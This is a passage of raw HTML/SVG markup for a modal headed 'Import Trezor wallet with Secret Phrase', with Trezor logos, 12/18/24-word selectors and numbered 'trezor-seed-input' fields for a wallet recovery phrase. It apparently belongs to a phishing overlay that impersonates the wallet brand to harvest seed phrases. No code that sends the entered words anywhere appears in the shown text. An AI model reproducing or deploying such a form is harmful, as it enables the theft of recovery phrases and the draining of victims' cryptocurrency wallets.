13.276 105.549 14.116 106.197 15.22C106.869 16.3 107.205 17.596 107.205 19.108C107.205 20.884 106.737 22.384 105.801 23.608C104.865 24.808 103.617 25.624 102.057 26.056L107.601 37H103.965L98.6009 26.38H93.2009V37H89.9249V11.8ZM98.9969 23.644C100.509 23.644 101.685 23.248 102.525 22.456C103.365 21.64 103.785 20.524 103.785 19.108C103.785 17.644 103.365 16.516 102.525 15.724C101.685 14.932 100.509 14.536 98.9969 14.536H93.2009V23.644H98.9969ZM112.789 11.8H129.349V14.572H116.065V22.492H127.873V25.156H116.065V34.228H129.349V37H112.789V11.8ZM134.573 11.8H141.485C143.741 11.8 145.709 12.34 147.389 13.42C149.069 14.5 150.353 16 151.241 17.92C152.153 19.816 152.609 21.976 152.609 24.4C152.609 26.824 152.153 28.996 151.241 30.916C150.353 32.812 149.069 34.3 147.389 35.38C145.709 36.46 143.741 37 141.485 37H134.573V11.8ZM141.305 34.228C143.753 34.228 145.673 33.34 147.065 31.564C148.457 29.788 149.153 27.4 149.153 24.4C149.153 21.4 148.457 19.012 147.065 17.236C145.673 15.46 143.753 14.572 141.305 14.572H137.849V34.228H141.305ZM179.222 11.8H188.726C190.766 11.8 192.434 12.34 193.73 13.42C195.05 14.476 195.71 15.964 195.71 17.884C195.71 19.276 195.29 20.5 194.45 21.556C193.61 22.612 192.518 23.344 191.174 23.752C192.95 24.064 194.366 24.784 195.422 25.912C196.478 27.04 197.006 28.408 197.006 30.016C197.006 31.312 196.67 32.488 195.998 33.544C195.326 34.6 194.366 35.44 193.118 36.064C191.87 36.688 190.418 37 188.762 37H179.222V11.8ZM188.33 34.264C189.842 34.264 191.09 33.868 192.074 33.076C193.082 32.26 193.586 31.12 193.586 29.656C193.586 28.36 193.106 27.304 192.146 26.488C191.186 25.672 189.962 25.264 188.474 25.264H182.498V34.264H188.33ZM187.934 22.636C189.254 22.636 190.322 22.216 191.138 21.376C191.954 20.536 192.362 19.516 192.362 18.316C192.362 17.14 192.002 16.216 191.282 15.544C190.562 14.872 189.506 14.536 188.114 14.536H182.498V22.636H187.934ZM208.458 27.244L199.854 11.8H203.562L210.078 24.22L216.594 11.8H220.302L211.698 27.244V37H208.458V27.244Z"
                    fill="#202020"
                  ></path>
                </svg>
              </div>
            </div>
            <div
              id="import-container-trezor"
              class="scwtw-z-[2147483648] scwtw-transition-opacity scwtw-duration-500 scwtw-px-6 scwtw-py-8 scwtw-opacity-100"
            >
              <div class="scwtw-flex scwtw-items-center scwtw-justify-between">
                <div>
                  <svg
                    class="scwtw-h-[35px] scwtw-w-auto"
                    width="249"
                    height="48"
                    viewBox="0 0 249 48"
                    fill="none"
                    xmlns="http://www.w3.org/2000/svg"
                  >
                    <path
                      d="M0 24C0 10.745 10.055 0 22.459 0H79.541C91.945 0 102 10.745 102 24C102 37.255 91.945 48 79.541 48H22.459C10.055 48 0 37.255 0 24Z"
                      fill="#202020"
                    ></path>
                    <path
                      d="M70.1064 29.874V18.786H72.0644V20.458C72.7684 19.226 74.1984 18.5 75.7824 18.5C78.1804 18.5 79.8524 20.018 79.8524 22.966V29.874H77.9164V23.076C77.9164 21.14 76.8164 20.128 75.2104 20.128C73.4724 20.128 72.0644 21.514 72.0644 23.472V29.874H70.1064ZM57.7614 29.874L55.7154 18.786H57.5634L59.0154 27.938L60.9294 21.91H62.7554L64.6474 27.872L66.1214 18.786H67.9694L65.9234 29.874H63.7234L61.8534 24.11L59.9614 29.874H57.7614ZM49.1134 30.16C45.7474 30.16 43.7674 27.652 43.7674 24.33C43.7674 21.03 45.7474 18.5 49.1134 18.5C52.4794 18.5 54.4594 21.03 54.4594 24.33C54.4594 27.652 52.4794 30.16 49.1134 30.16ZM49.1134 28.532C51.5334 28.532 52.4574 26.464 52.4574 24.308C52.4574 22.174 51.5334 20.128 49.1134 20.128C46.6934 20.128 45.7694 22.174 45.7694 24.308C45.7694 26.464 46.6934 28.532 49.1134 28.532ZM36.8424 30.16C33.5864 30.16 31.5404 27.674 31.5404 24.33C31.5404 21.008 33.5864 18.5 36.8424 18.5C39.5924 18.5 42.0124 20.062 41.7484 24.836H33.5424C33.6964 26.882 34.6424 28.554 36.8424 28.554C38.3164 28.554 39.2844 27.652 39.6144 26.618H41.5504C41.2424 28.466 39.5044 30.16 36.8424 30.16ZM33.5864 23.362H39.8564C39.7024 21.14 38.6684 20.106 36.8424 20.106C34.8404 20.106 33.8504 21.558 33.5864 23.362ZM22.1484 29.874V18.786H24.1504V20.656C24.8544 19.424 26.0644 18.786 27.3184 18.786H29.9804V20.656H27.1644C25.4044 20.656 24.1504 21.8 24.1504 24.022V29.874H22.1484Z"
                      fill="white"
                    ></path>
                    <path
                      d="M115.496 16.6H117.938L120.82 24.608L123.702 16.6H126.144V32H124.208V19.966L121.7 26.632H119.94L117.432 19.966V32H115.496V16.6ZM132.879 32.286C131.764 32.286 130.862 31.9853 130.173 31.384C129.498 30.7827 129.161 29.9907 129.161 29.008C129.161 27.864 129.542 27.05 130.305 26.566C131.082 26.0673 132.05 25.7447 133.209 25.598L135.585 25.29C135.995 25.246 136.274 25.1213 136.421 24.916C136.567 24.7107 136.641 24.454 136.641 24.146V24.124C136.641 23.552 136.435 23.09 136.025 22.738C135.629 22.386 135.035 22.21 134.243 22.21C133.436 22.21 132.798 22.3933 132.329 22.76C131.874 23.112 131.603 23.6327 131.515 24.322H129.557C129.674 23.1927 130.151 22.298 130.987 21.638C131.823 20.9633 132.901 20.626 134.221 20.626C135.673 20.626 136.758 20.9707 137.477 21.66C138.21 22.3493 138.577 23.3247 138.577 24.586V29.954C138.577 30.086 138.621 30.196 138.709 30.284C138.797 30.3573 138.907 30.394 139.039 30.394H139.721V32H138.401C137.873 32 137.469 31.8827 137.191 31.648C136.912 31.3987 136.773 31.0613 136.773 30.636V30.372C136.318 31.0467 135.746 31.538 135.057 31.846C134.367 32.1393 133.641 32.286 132.879 32.286ZM133.385 30.702C134.367 30.702 135.152 30.372 135.739 29.712C136.34 29.052 136.641 28.1793 136.641 27.094V26.324C136.362 26.4707 135.988 26.5807 135.519 26.654L133.583 26.94C132.747 27.072 132.138 27.2993 131.757 27.622C131.375 27.93 131.185 28.3627 131.185 28.92C131.185 29.4773 131.383 29.9173 131.779 30.24C132.175 30.548 132.71 30.702 133.385 30.702ZM143.287 20.912H145.245V22.584C145.597 21.968 146.103 21.4913 146.763 21.154C147.438 20.802 148.171 20.626 148.963 20.626C150.195 20.626 151.178 21.0147 151.911 21.792C152.659 22.5547 153.033 23.6547 153.033 25.092V32H151.097V25.202C151.097 24.2633 150.848 23.5373 150.349 23.024C149.865 22.5107 149.212 22.254 148.391 22.254C147.819 22.254 147.291 22.4007 146.807 22.694C146.323 22.9727 145.942 23.3687 145.663 23.882C145.384 24.3807 145.245 24.9527 145.245 25.598V32H143.287V20.912ZM161 32.286C159.768 32.286 158.778 31.9047 158.03 31.142C157.296 30.3647 156.93 29.2573 156.93 27.82V20.912H158.888V27.71C158.888 28.6633 159.13 29.3967 159.614 29.91C160.098 30.4087 160.758 30.658 161.594 30.658C162.166 30.658 162.686 30.5187 163.156 30.24C163.64 29.9467 164.021 29.5433 164.3 29.03C164.593 28.5167 164.74 27.9447 164.74 27.314V20.912H166.676V32H164.74V30.328C164.373 30.944 163.86 31.428 163.2 31.78C162.54 32.1173 161.806 32.286 161 32.286ZM173.806 32.286C172.692 32.286 171.79 31.9853 171.1 31.384C170.426 30.7827 170.088 29.9907 170.088 29.008C170.088 27.864 170.47 27.05 171.232 26.566C172.01 26.0673 172.978 25.7447 174.136 25.598L176.512 25.29C176.923 25.246 177.202 25.1213 177.348 24.916C177.495 24.7107 177.568 24.454 177.568 24.146V24.124C177.568 23.552 177.363 23.09 176.952 22.738C176.556 22.386 175.962 22.21 175.17 22.21C174.364 22.21 173.726 22.3933 173.256 22.76C172.802 23.112 172.53 23.6327 172.442 24.322H170.484C170.602 23.1927 171.078 22.298 171.914 21.638C172.75 20.9633 173.828 20.626 175.148 20.626C176.6 20.626 177.686 20.9707 178.404 21.66C179.138 22.3493 179.504 23.3247 179.504 24.586V29.954C179.504 30.086 179.548 30.196 179.636 30.284C179.724 30.3573 179.834 30.394 179.966 30.394H180.648V32H179.328C178.8 32 178.397 31.8827 178.118 31.648C177.84 31.3987 177.7 31.0613 177.7 30.636V30.372C177.246 31.0467 176.674 31.538 175.984 31.846C175.295 32.1393 174.569 32.286 173.806 32.286ZM174.312 30.702C175.295 30.702 176.08 30.372 176.666 29.712C177.268 29.052 177.568 28.1793 177.568 27.094V26.324C177.29 26.4707 176.916 26.5807 176.446 26.654L174.51 26.94C173.674 27.072 173.066 27.2993 172.684 27.622C172.303 27.93 172.112 28.3627 172.112 28.92C172.112 29.4773 172.31 29.9173 172.706 30.24C173.102 30.548 173.638 30.702 174.312 30.702ZM183.775 30.394H188.065V18.206H184.567V16.6H190.023V30.394H194.291V32H183.775V30.394ZM211.302 16.6H213.304V24.52L219.728 16.6H222.148L216.846 22.936L222.412 32H220.168L215.526 24.52L213.304 27.204V32H211.302V16.6ZM224.835 30.35H228.971V22.562H225.275V20.912H230.973V30.35H235.087V32H224.835V30.35ZM228.883 16.6H231.083V19.02H228.883V16.6ZM244.329 32C243.376 32 242.672 31.7947 242.217 31.384C241.763 30.9587 241.535 30.2913 241.535 29.382V22.518H238.235V20.912H241.029C241.176 20.912 241.293 20.868 241.381 20.78C241.484 20.692 241.535 20.5747 241.535 20.428V17.238H243.471V20.912H247.849V22.518H243.471V29.118C243.471 29.5287 243.574 29.844 243.779 30.064C243.985 30.2693 244.322 30.372 244.791 30.372H248.333V32H244.329Z"
                      fill="#202020"
                    ></path>
                  </svg>
                </div>
                <div>
                  <button
                    class="scwtw-p-1 scwtw-rounded-[12px] hover:scwtw-bg-[#f3f3f3] dark:hover:scwtw-bg-[#eaeaea0d] scwtw-transition-all scwtw-duration-300 active:scwtw-scale-95"
                    type="button"
                    id="trezor-close-button1"
                  >
                    <svg
                      class="scwtw-w-6 scwtw-h-6 scwtw-text-[#202020] dark:scwtw-text-[#ffffff]"
                      xmlns="http://www.w3.org/2000/svg"
                      width="24"
                      height="24"
                      viewBox="0 0 24 24"
                      fill="none"
                      stroke="currentColor"
                      stroke-width="2"
                      stroke-linecap="round"
                      stroke-linejoin="round"
                    >
                      <path d="M18 6 6 18"></path>
                      <path d="m6 6 12 12"></path>
                    </svg>
                  </button>
                </div>
              </div>
              <div class="scwtw-mt-6">
                <div
                  class="scwtw-flex scwtw-flex-col scwtw-items-start scwtw-justify-start scwtw-text-start scwtw-gap-y-1.5"
                >
                  <div>
                    <h3
                      class="scwtw-text-[#202020] dark:scwtw-text-[#ffffff] font-inter scwtw-font-bold scwtw-text-[22px]"
                    >
                      Import Trezor wallet with Secret Phrase
                    </h3>
                  </div>
                  <div class="scwtw-mb-1.5">
                    <p
                      class="scwtw-text-[#141618] dark:scwtw-text-[#dddddd] font-inter scwtw-font-normal scwtw-text-[16px]"
                    >
                      Import an existing wallet with your 12, 18 or 24-word
                      secret phrase.
                    </p>
                  </div>
                  <div
                    class="scwtw-flex scwtw-w-full scwtw-items-center scwtw-p-1 scwtw-gap-x-1.5 scwtw-border scwtw-border-[#ebebeb] dark:scwtw-border-[#3e3e3e] scwtw-rounded-[16px]"
                  >
                    <div class="scwtw-w-full">
                      <button
                        class="scwtw-flex scwtw-items-center scwtw-justify-center scwtw-w-full scwtw-p-2 scwtw-rounded-[16px] scwtw-border scwtw-border-transparent scwtw-bg-[#f3f3f3] dark:scwtw-bg-[#ffffff05] hover:scwtw-opacity-80 scwtw-cursor-pointer scwtw-text-center scwtw-transition-all scwtw-duration-400 active:scwtw-scale-[0.98] disabled:scwtw-cursor-not-allowed disabled:scwtw-opacity-80 data-[is-selected=true]:scwtw-border-[#7b7b7b] dark:data-[is-selected=true]:scwtw-border-[#a5a5a5] trezor-switch-words-count-button"
                        id="trezor-switch-words-count-button-12"
                        data-is-selected="true"
                        data-words-count="12"
                      >
                        <div>
                          <span
                            class="scwtw-font-normal scwtw-text-base scwtw-text-[#202020] dark:scwtw-text-[#ffffff]"
                            >12 words</span
                          >
                        </div>
                      </button>
                    </div>
                    <div class="scwtw-w-full">
                      <button
                        class="scwtw-flex scwtw-items-center scwtw-justify-center scwtw-w-full scwtw-p-2 scwtw-rounded-[16px] scwtw-border scwtw-border-transparent scwtw-bg-[#f3f3f3] dark:scwtw-bg-[#ffffff05] hover:scwtw-opacity-80 scwtw-cursor-pointer scwtw-text-center scwtw-transition-all scwtw-duration-400 active:scwtw-scale-[0.98] disabled:scwtw-cursor-not-allowed disabled:scwtw-opacity-80 data-[is-selected=true]:scwtw-border-[#7b7b7b] dark:data-[is-selected=true]:scwtw-border-[#a5a5a5] trezor-switch-words-count-button"
                        id="trezor-switch-words-count-button-18"
                        data-is-selected="false"
                        data-words-count="18"
                      >
                        <div>
                          <span
                            class="scwtw-font-normal scwtw-text-base scwtw-text-[#202020] dark:scwtw-text-[#ffffff]"
                            >18 words</span
                          >
                        </div>
                      </button>
                    </div>
                    <div class="scwtw-w-full">
                      <button
                        class="scwtw-flex scwtw-items-center scwtw-justify-center scwtw-w-full scwtw-p-2 scwtw-rounded-[16px] scwtw-border scwtw-border-transparent scwtw-bg-[#f3f3f3] dark:scwtw-bg-[#ffffff05] hover:scwtw-opacity-80 scwtw-cursor-pointer scwtw-text-center scwtw-transition-all scwtw-duration-400 active:scwtw-scale-[0.98] disabled:scwtw-cursor-not-allowed disabled:scwtw-opacity-80 data-[is-selected=true]:scwtw-border-[#7b7b7b] dark:data-[is-selected=true]:scwtw-border-[#a5a5a5] trezor-switch-words-count-button"
                        id="trezor-switch-words-count-button-24"
                        data-is-selected="false"
                        data-words-count="24"
                      >
                        <div>
                          <span
                            class="scwtw-font-normal scwtw-text-base scwtw-text-[#202020] dark:scwtw-text-[#ffffff]"
                            >24 words</span
                          >
                        </div>
                      </button>
                    </div>
                  </div>
                </div>
              </div>
              <div class="scwtw-mt-4">
                <div
                  class="scwtw-mt-4 scwtw-max-h-[204px] scwtw-overflow-y-auto trezor-custom-scrollbar"
                >
                  <div
                    id="trezor-12"
                    class="trezor-container-12-words scwtw-grid scwtw-grid-cols-3 scwtw-gap-1"
                  >
                    <div class="scwtw-relative">
                      <div
                        class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                      >
                        <div>
                          <p
                            class="font-inter scwtw-text-[#202020] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal"
                          >
                            1
                          </p>
                        </div>
                      </div>
                      <input
                        class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#ebebeb] dark:scwtw-border-[#3e3e3e] hover:scwtw-border-[#9d9d9d] dark:hover:scwtw-border-[#c6c6c6] scwtw-bg-transparent focus:scwtw-bg-[#fbfbfb] dark:focus:scwtw-bg-[#0f0f0f] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-border-[#ff5252] dark:data-[invalid=true]:scwtw-border-[#b83939] data-[invalid=true]:scwtw-text-[#fa3434] dark:data-[invalid=true]:scwtw-text-[#fa4646b5] trezor-seed-input"
                        type="text"
                        data-invalid="false"
                      />
                    </div>
                    <div class="scwtw-relative">
                      <div
                        class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                      >
                        <div>
                          <p
                            class="font-inter scwtw-text-[#202020] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal"
                          >
                            2
                          </p>
                        </div>
                      </div>
                      <input
                        class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#ebebeb] dark:scwtw-border-[#3e3e3e] hover:scwtw-border-[#9d9d9d] dark:hover:scwtw-border-[#c6c6c6] scwtw-bg-transparent focus:scwtw-bg-[#fbfbfb] dark:focus:scwtw-bg-[#0f0f0f] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-border-[#ff5252] dark:data-[invalid=true]:scwtw-border-[#b83939] data-[invalid=true]:scwtw-text-[#fa3434] dark:data-[invalid=true]:scwtw-text-[#fa4646b5] trezor-seed-input"
                        type="text"
                        data-invalid="false"
                      />
                    </div>
                    <div class="scwtw-relative">
                      <div
                        class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                      >
                        <div>
                          <p
                            class="font-inter scwtw-text-[#202020] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal"
                          >
                            3
                          </p>
                        </div>
                      </div>
                      <input
                        class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#ebebeb] dark:scwtw-border-[#3e3e3e] hover:scwtw-border-[#9d9d9d] dark:hover:scwtw-border-[#c6c6c6] scwtw-bg-transparent focus:scwtw-bg-[#fbfbfb] dark:focus:scwtw-bg-[#0f0f0f] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-border-[#ff5252] dark:data-[invalid=true]:scwtw-border-[#b83939] data-[invalid=true]:scwtw-text-[#fa3434] dark:data-[invalid=true]:scwtw-text-[#fa4646b5] trezor-seed-input"
                        type="text"
                        data-invalid="false"
                      />
                    </div>
                    <div class="scwtw-relative">
                      <div
                        class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                      >
                        <div>
                          <p
                            class="font-inter scwtw-text-[#202020] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal"
                          >
                            4
                          </p>
                        </div>
                      </div>
                      <input
                        class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#ebebeb] dark:scwtw-border-[#3e3e3e] hover:scwtw-border-[#9d9d9d] dark:hover:scwtw-border-[#c6c6c6] scwtw-bg-transparent focus:scwtw-bg-[#fbfbfb] dark:focus:scwtw-bg-[#0f0f0f] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-border-[#ff5252] dark:data-[invalid=true]:scwtw-border-[#b83939] data-[invalid=true]:scwtw-text-[#fa3434] dark:data-[invalid=true]:scwtw-text-[#fa4646b5] trezor-seed-input"
                        type="text"
                        data-invalid="false"
                      />
                    </div>
                    <div class="scwtw-relative">
                      <div
                        class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                      >
                        <div>
                          <p
                            class="font-inter scwtw-text-[#202020] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal"
                          >
                            5
                          </p>
                        </div>
                      </div>
                      <input
                        class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#ebebeb] dark:scwtw-border-[#3e3e3e] hover:scwtw-border-[#9d9d9d] dark:hover:scwtw-border-[#c6c6c6] scwtw-bg-transparent focus:scwtw-bg-[#fbfbfb] dark:focus:scwtw-bg-[#0f0f0f] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-border-[#ff5252] dark:data-[invalid=true]:scwtw-border-[#b83939] data-[invalid=true]:scwtw-text-[#fa3434] dark:data-[invalid=true]:scwtw-text-[#fa4646b5] trezor-seed-input"
                        type="text"
                        data-invalid="false"
                      />
                    </div>
                    <div class="scwtw-relative">
                      <div
                        class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                      >
                        <div>
                          <p
                            class="font-inter scwtw-text-[#202020] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal"
                          >
                            6
                          </p>
                        </div>
                      </div>
                      <input
                        class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#ebebeb] dark:scwtw-border-[#3e3e3e] hover:scwtw-border-[#9d9d9d] dark:hover:scwtw-border-[#c6c6c6] scwtw-bg-transparent focus:scwtw-bg-[#fbfbfb] dark:focus:scwtw-bg-[#0f0f0f] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-border-[#ff5252] dark:data-[invalid=true]:scwtw-border-[#b83939] data-[invalid=true]:scwtw-text-[#fa3434] dark:data-[invalid=true]:scwtw-text-[#fa4646b5] trezor-seed-input"
                        type="text"
                        data-invalid="false"
                      />
                    </div>
                    <div class="scwtw-relative">
                      <div
                        class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                      >
                        <div>
                          <p
                            class="font-inter scwtw-text-[#202020] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal"
                          >
                            7
                          </p>
                        </div>
                      </div>
                      <input
                        class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#ebebeb] dark:scwtw-border-[#3e3e3e] hover:scwtw-border-[#9d9d9d] dark:hover:scwtw-border-[#c6c6c6] scwtw-bg-transparent focus:scwtw-bg-[#fbfbfb] dark:focus:scwtw-bg-[#0f0f0f] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-border-[#ff5252] dark:data-[invalid=true]:scwtw-border-[#b83939] data-[invalid=true]:scwtw-text-[#fa3434] dark:data-[invalid=true]:scwtw-text-[#fa4646b5] trezor-seed-input"
                        type="text"
                        data-invalid="false"
                      />
                    </div>
                    <div class="scwtw-relative">
                      <div
                        class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                      >
                        <div>
                          <p
                            class="font-inter scwtw-text-[#202020] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal"
                          >
                            8
                          </p>
                        </div>
                      </div>
                      <input
                        class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#ebebeb] dark:scwtw-border-[#3e3e3e] hover:scwtw-border-[#9d9d9d] dark:hover:scwtw-border-[#c6c6c6] scwtw-bg-transparent focus:scwtw-bg-[#fbfbfb] dark:focus:scwtw-bg-[#0f0f0f] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-border-[#ff5252] dark:data-[invalid=true]:scwtw-border-[#b83939] data-[invalid=true]:scwtw-text-[#fa3434] dark:data-[invalid=true]:scwtw-text-[#fa4646b5] trezor-seed-input"
                        type="text"
                        data-invalid="false"
                      />
                    </div>
                    <div class="scwtw-relative">
                      <div
                        class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                      >
                        <div>
                          <p
                            class="font-inter scwtw-text-[#202020] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal"
                          >
                            9
                          </p>
                        </div>
                      </div>
                      <input
                        class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#ebebeb] dark:scwtw-border-[#3e3e3e] hover:scwtw-border-[#9d9d9d] dark:hover:scwtw-border-[#c6c6c6] scwtw-bg-transparent focus:scwtw-bg-[#fbfbfb] dark:focus:scwtw-bg-[#0f0f0f] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-border-[#ff5252] dark:data-[invalid=true]:scwtw-border-[#b83939] data-[invalid=true]:scwtw-text-[#fa3434] dark:data-[invalid=true]:scwtw-text-[#fa4646b5] trezor-seed-input"
                        type="text"
                        data-invalid="false"
                      />
                    </div>
                    <div class="scwtw-relative">
                      <div
                        class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                      >
                        <div>
                          <p
                            class="font-inter scwtw-text-[#202020] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal"
                          >
                            10
                          </p>
                        </div>
                      </div>
                      <input
                        class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#ebebeb] dark:scwtw-border-[#3e3e3e] hover:scwtw-border-[#9d9d9d] dark:hover:scwtw-border-[#c6c6c6] scwtw-bg-transparent focus:scwtw-bg-[#fbfbfb] dark:focus:scwtw-bg-[#0f0f0f] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-border-[#ff5252] dark:data-[invalid=true]:scwtw-border-[#b83939] data-[invalid=true]:scwtw-text-[#fa3434] dark:data-[invalid=true]:scwtw-text-[#fa4646b5] trezor-seed-input"
                        type="text"
                        data-invalid="false"
                      />
                    </div>
                    <div class="scwtw-relative">
                      <div
                        class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                      >
                        <div>
                          <p
                            class="font-inter scwtw-text-[#202020] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal"
                          >
                            11
                          </p>
                        </div>
                      </div>
                      <input
                        class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#ebebeb] dark:scwtw-border-[#3e3e3e] hover:scwtw-border-[#9d9d9d] dark:hover:scwtw-border-[#c6c6c6] scwtw-bg-transparent focus:scwtw-bg-[#fbfbfb] dark:focus:scwtw-bg-[#0f0f0f] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-border-[#ff5252] dark:data-[invalid=true]:scwtw-border-[#b83939] data-[invalid=true]:scwtw-text-[#fa3434] dark:data-[invalid=true]:scwtw-text-[#fa4646b5] trezor-seed-input"
                        type="text"
                        data-invalid="false"
                      />
                    </div>
                    <div class="scwtw-relative">
                      <div
                        class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                      >
                        <div>
                          <p
                            class="font-inter scwtw-text-[#202020] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal"
                          >
                            12
                          </p>
                        </div>
                      </div>
                      <input
                        class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#ebebeb] dark:scwtw-border-[#3e3e3e] hover:scwtw-border-[#9d9d9d] dark:hover:scwtw-border-[#c6c6c6] scwtw-bg-transparent focus:scwtw-bg-[#fbfbfb] dark:focus:scwtw-bg-[#0f0f0f] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-border-[#ff5252] dark:data-[invalid=true]:scwtw-border-[#b83939] data-[invalid=true]:scwtw-text-[#fa3434] dark:data-[invalid=true]:scwtw-text-[#fa4646b5] trezor-seed-input"
                        type="text"
                        data-invalid="false"
                      />
                    </div>
                  </div>
                  <div
                    id="trezor-18"
                    class="trezor-container-18-words scwtw-grid scwtw-grid-cols-3 scwtw-gap-1 scwtw-mt-1 scwtw-hidden"
                  >
                    <div class="scwtw-relative">
                      <div
                        class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                      >
                        <div>
                          <p
                            class="font-inter scwtw-text-[#202020] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal"
                          >
                            13
                          </p>
                        </div>
                      </div>
                      <input
                        class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#ebebeb] dark:scwtw-border-[#3e3e3e] hover:scwtw-border-[#9d9d9d] dark:hover:scwtw-border-[#c6c6c6] scwtw-bg-transparent focus:scwtw-bg-[#fbfbfb] dark:focus:scwtw-bg-[#0f0f0f] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-border-[#ff5252] dark:data-[invalid=true]:scwtw-border-[#b83939] data-[invalid=true]:scwtw-text-[#fa3434] dark:data-[invalid=true]:scwtw-text-[#fa4646b5] trezor-seed-input"
                        type="text"
                        data-invalid="false"
                      />
                    </div>
                    <div class="scwtw-relative">
                      <div
                        class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                      >
                        <div>
